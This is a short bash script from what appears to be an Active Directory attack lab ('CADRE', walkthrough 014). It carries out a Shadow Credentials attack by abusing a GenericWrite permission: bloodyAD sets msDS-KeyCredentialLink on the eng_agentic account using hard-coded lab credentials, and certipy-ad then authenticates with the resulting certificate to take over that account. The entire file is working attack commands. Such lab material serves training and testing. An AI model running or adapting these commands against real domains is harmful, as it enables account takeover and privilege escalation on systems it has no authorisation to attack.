#!/bin/bash
# CADRE — WT#014 ACL GenericWrite
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#014 — ACL GenericWrite"
start_attack "014" "ACL GenericWrite"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Set msDS-KeyCredentialLink on eng_agentic (Shadow Credentials via GenericWrite)"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u analyst_cloud -p 'Cl0ud_An@lyst!' set object \"CN=eng_agentic,OU=Agentic,DC=cadre,DC=local\" msDS-KeyCredentialLink -v \"...\""

step "Step 2: Authenticate with generated certificate"
run_cmd "certipy-ad auth -pfx shadow.pfx -dc-ip $DC01 -domain $DOMAIN_ROOT"

result $? "GenericWrite (Shadow Credentials) attack completed"
